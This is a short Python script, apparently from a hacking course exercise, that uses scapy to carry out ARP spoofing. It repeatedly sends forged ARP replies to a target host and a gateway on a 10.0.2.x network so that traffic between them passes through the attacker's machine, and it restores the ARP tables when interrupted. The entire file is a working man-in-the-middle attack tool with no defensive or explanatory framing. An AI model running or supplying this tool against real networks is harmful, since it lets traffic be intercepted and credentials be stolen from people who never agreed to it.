from os import supports_follow_symlinks
import scapy.all as scapy
import time

from scapy.sendrecv import send, sniff


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcat = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_reques_broadcast = broadcat/arp_request
    # VERBOSE IS OFF DETAIL WILL NOT BE DISPLAYED
    answered_list = scapy.srp(arp_reques_broadcast,
                              timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4)


target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"

try:
    sent_packet_count = 0
    while True:

        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count += 2
        print("\r[+] Sent packets: " + str(sent_packet_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Quiting the program.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
